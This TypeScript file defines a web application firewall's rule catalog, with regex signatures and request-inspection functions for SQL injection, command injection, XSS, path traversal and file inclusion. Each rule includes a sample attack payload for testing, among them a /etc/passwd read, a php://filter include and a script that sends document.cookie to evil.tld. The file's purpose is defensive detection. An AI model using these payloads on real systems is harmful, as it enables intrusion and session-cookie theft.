/**
 * Web Application Firewall — the rule catalog (single source of truth).
 *
 * The gateway's edge WAF (`src/lib/gateway/waf.ts`) and the `/console/waf` console
 * both consume THIS catalog, so the rules the console advertises are exactly the rules
 * the edge enforces — no drift, no decorative rules. Each rule is a named, categorized,
 * severity-ranked set of signatures; `inspectPayload` runs them in severity order and
 * returns the first match, mirroring the gateway's `406 Not Acceptable` block.
 *
 * Deterministic: static signatures only, no `Math.random`, no state — the same payload
 * always yields the same verdict on the client and at the edge.
 */

export type WafSeverity = 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';

export type WafCategory =
  | 'sqli'
  | 'xss'
  | 'path-traversal'
  | 'command-injection'
  | 'file-inclusion';

/** A single WAF rule: a category of attack, its signatures, and how it's blocked. */
export interface WafRule {
  /** Stable rule id, surfaced as the block `reason` (e.g. `WAF_SQLI_DETECTED`). */
  id: string;
  category: WafCategory;
  /** Human label for the console. */
  name: string;
  severity: WafSeverity;
  /** One-line description of what the rule catches. */
  description: string;
  /** Detection signatures — a match on any one trips the rule. */
  signatures: RegExp[];
  /** A benign example that must NOT trip the rule (used by the console + tests). */
  safeExample: string;
  /** A representative malicious payload the rule catches (console "try it" seed). */
  attackExample: string;
}

/** The verdict shape — mirrors `WafResult` in the gateway. */
export interface WafVerdict {
  blocked: boolean;
  /** The tripped rule's id, as the gateway's block `reason`. */
  reason?: string;
  category?: WafCategory;
  severity?: WafSeverity;
  /** Which rule matched (for the console; omitted at the edge). */
  ruleName?: string;
}

/** Severity rank for ordered evaluation (highest first) + console sorting. */
export const SEVERITY_RANK: Record<WafSeverity, number> = {
  CRITICAL: 3,
  HIGH: 2,
  MEDIUM: 1,
  LOW: 0,
};

/**
 * The rule catalog. Ordered CRITICAL → LOW so the most severe match wins.
 * The `sqli` and `xss` signatures are the exact ones the gateway shipped with;
 * the rest strengthen coverage while staying false-positive-safe on normal API traffic.
 */
export const WAF_RULES: readonly WafRule[] = [
  {
    id: 'WAF_SQLI_DETECTED',
    category: 'sqli',
    name: 'SQL Injection',
    severity: 'CRITICAL',
    description: 'Inline SQL verbs against a table, or a tautology like ’ OR 1=1 used to subvert a query.',
    signatures: [
      /(\b(select|update|delete|insert|drop|truncate|alter)\b\s+.*?\b(from|into|table)\b)/i,
      /('|")\s*(OR|AND)\s*('|")?\d/i, // ' OR 1=1
    ],
    safeExample: "acme corp, inc. — select markets",
    attackExample: "'; DROP TABLE users; --",
  },
  {
    id: 'WAF_CMDI_DETECTED',
    category: 'command-injection',
    name: 'Command Injection',
    severity: 'CRITICAL',
    description: 'Shell metacharacters chaining an OS command (`;`, `|`, `&&`, backticks, `$(…)`) onto input.',
    signatures: [
      /[;|&`]\s*(cat|ls|rm|curl|wget|nc|bash|sh|whoami|id|uname|ping)\b/i,
      /\$\([^)]*\)/, // $(...)
      /\|\s*(cat|ls|rm|curl|wget|nc|bash|sh)\b/i,
    ],
    safeExample: "R&D | Sales & Marketing",
    attackExample: "email=x; cat /etc/passwd",
  },
  {
    id: 'WAF_XSS_DETECTED',
    category: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    severity: 'HIGH',
    description: 'A <script> block, a javascript: URI, or an inline event handler injected into a value.',
    signatures: [
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/i,
      /javascript:/i,
      /onerror\s*=/i,
      /onload\s*=/i,
    ],
    safeExample: "onload times are great; see our script for details",
    attackExample: "<script>fetch('//evil.tld?c='+document.cookie)</script>",
  },
  {
    id: 'WAF_PATH_TRAVERSAL_DETECTED',
    category: 'path-traversal',
    name: 'Path Traversal',
    severity: 'HIGH',
    description: 'Dot-dot sequences (raw or URL-encoded) that climb out of the intended directory.',
    signatures: [
      /(\.\.[/\\]){2,}/, // ../../ or ..\..\
      /(%2e%2e[%2f5c]{1,3}){2,}/i, // encoded ../
      /\/etc\/passwd\b/i,
    ],
    safeExample: "path: reports/2026/q3.csv",
    attackExample: "file=../../../../etc/passwd",
  },
  {
    id: 'WAF_RFI_DETECTED',
    category: 'file-inclusion',
    name: 'Remote / Local File Inclusion',
    severity: 'HIGH',
    description: 'A parameter smuggling a file:// or php:// wrapper, or a remote include URL.',
    signatures: [
      /=\s*(file|php|data|expect|phar):\/\//i,
      /=\s*https?:\/\/[^\s&]+\.(php|asp|jsp|cgi)\b/i,
    ],
    safeExample: "callback=https://acme.example.com/webhooks/enrich",
    attackExample: "template=php://filter/convert.base64-encode/resource=config",
  },
];

/**
 * Inspect a composed payload string against the catalog, returning the first
 * (most-severe) match. This is the client-side mirror of the gateway's
 * `inspectPayload`; feed it the same URL + headers + body the edge would see.
 */
export function inspectString(payload: string): WafVerdict {
  for (const rule of WAF_RULES) {
    for (const sig of rule.signatures) {
      if (sig.test(payload)) {
        return {
          blocked: true,
          reason: rule.id,
          category: rule.category,
          severity: rule.severity,
          ruleName: rule.name,
        };
      }
    }
  }
  return { blocked: false };
}

/**
 * Compose the inspection string the way the gateway does (URL + headers + body),
 * then run the catalog. Kept identical to the edge so a console verdict predicts
 * the real 406.
 */
export function inspectRequest(
  url: string,
  headers: Record<string, string> = {},
  body?: unknown,
): WafVerdict {
  let payload = url;
  try {
    payload = `${url} ${JSON.stringify(headers)} ${body ? JSON.stringify(body) : ''}`;
  } catch {
    // fall back to the URL alone if body isn't serializable
  }
  return inspectString(payload);
}

/** Count of rules by severity — for the console's KPI tiles. */
export function ruleCountsBySeverity(): Record<WafSeverity, number> {
  const counts: Record<WafSeverity, number> = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
  WAF_RULES.forEach((r) => { counts[r.severity] += 1; });
  return counts;
}
